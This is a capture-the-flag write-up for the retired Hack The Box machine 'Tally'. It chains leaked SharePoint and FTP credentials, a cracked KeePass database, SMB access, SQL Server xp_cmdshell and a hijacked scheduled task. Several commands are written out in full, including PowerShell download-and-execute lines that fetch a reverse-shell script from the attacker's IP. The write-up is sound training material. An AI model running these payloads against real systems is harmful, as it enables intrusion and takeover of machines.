# Tally

This is the write-up for the box Tally that got retired at the 28th May 2018.
My IP address was 10.10.14.34 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.59    tally.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/tally.nmap 10.10.10.59
```

```markdown
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:         
|_  SYST: Windows_NT                                                                             
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                      
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: TALLY                                                                           
|   NetBIOS_Domain_Name: TALLY                                                                   
|   NetBIOS_Computer_Name: TALLY       
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-05-23T16:45:02
|_Not valid after:  2050-05-23T16:45:02
|_ssl-date: 2020-05-23T16:48:23+00:00; +2m27s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The web page is a **SharePoint** page with no contents.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.59 dir -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt
```

An interesting directory in SharePoint by default is _/_layouts/viewlsts.aspx_ in which it shows the sites contents:

![Site contents](tally_web-1.png)

In _Site Pages_ is a web page file called _"FinanceTeam.aspx"_ which is a page on the SharePoint with the following message:
```markdown
Hi all,

Welcome to your new team page!
As always, there's still a few finishing touches to make. Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks - Sarah & Tim.
```

In _Documents_ is a Word document called _"ftp-details.docx"_ with the following contents:
```markdown
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

Combining the information from the message and the Word document, it means we probably got credentials for the FTP service:
> ftp_user:UTDRSCH53c"$6hys

```markdown
ftp 10.10.10.59
```

Login works and enumerating the FTP service is next.

## Checking FTP (Port 21)

In the FTP directory are many folders with subfolders and files, so lets download all of it to our local client.
```markdown
wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
```

The top folders are as follows with many subfolders:
- From-Custodian
- Intranet
- Logs
- To-Upload
- User

In _/User_ are 9 usernames and _Tim_ has a **KeePass** database in _User/Tim/Files/tim.kdbx_ and a text file in _User/Tim/Project/Log/do to.txt_ that says:
```markdown
To do:
Remove migration folder
Set secure share permissions

encrypted share creds:
password in keepass
```

Lets try to crack the password of the KeePass database:
```markdown
keepass2john ./Tim/Files/tim.kdbx

# Output
$keepass$\*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

Cracking the hash with **Hashcat**:
```markdown
hashcat -m 13400 tally-tim.keepass /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password is:
> simplementeyo

There are two credentials in there and one that could be the one for the encrypted share he mentioned in his text file:
```markdown
Title: TALLY ACCT share
User Name: Finance
Password: Acc0unting

Title: Default
User Name: cisco
Password: cisco123
```

We know that the SMB service is open so lets mount the share locally for easier browsing:
```markdown
mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/tally
```

The password works and enumerating SMB is next.

## Checking SMB (Port 445)

There are many folders and subfolders but the most interesting folder is called _zz_Migration_ as _Tim_ wanted to remove this folder.
After searching for a while, there is a binary called _zz_Migration/Binaries/New Folder/tester.exe_ which looks suspect next to the other binaries that are legitimate.

Lets look at the **strings** of the binary:
 ```markdown
strings tester.exe
```

It seems like there are hardcoded credentials in the binary for **Orchard database**:
```markdown
(...)
Message:
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
(...)
```

As the initial scan showed, **Microsoft SQL Server** service listens on port 1433 and login with these credentials work:
```markdown
sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
```

## Checking Microsoft SQL Server (Port 1433)

With the connection on MS SQL Server we try to start a shell on the box:
```markdown
xp_cmdshell
go
```

It says that is not enabled, so lets enable it:
```markdown
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go

EXEC SP_CONFIGURE 'xp_cmdshell', 1
reconfigure
go
```

Now executing a `whoami` command:
```markdown
xp_cmdshell 'whoami'
go
```

It shows that we are the local user _sarah_. I will use a the _Invoke-PowerShellTcp.ps1_ script from the **Nishang Framework** so start a reverse shell on the box:
```markdown
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34/Invoke-PowerShellTcp.ps1')"
go
```

After executing the listener on my IP and port 9001 starts a reverse shell session as _sarah_.

## Privilege Escalation

In the home directory _C:/Users/Sarah/Desktop_ are some more interesting files:
- note to tim (draft).txt
```markdown
Hi Tim,

As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.

Thanks,
Sarah
```

- todo.txt
```markdown
done:
install updates
check windows defender enabled

outstanding:
update intranet design
update server inventory
```

- SPBestWarmUp.ps & SPBestWarmUp.xml

The Powershell script can be found on the internet but it is irrelevant what it does. In the XML file it shows, that it creates a scheduled task which executes the Powershell script every hour with the user id of _TALLY\Administrator_.

Our user has permission to write to the Powershell script, so lets use it to start a reverse shell as _Administrator_.
```markdown
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34/Invoke-PowerShellTcp.ps1')" > SPBestWarmUp.ps1
```

After one hour the listener on my IP and port 9002 will start a reverse shell as Administrator!
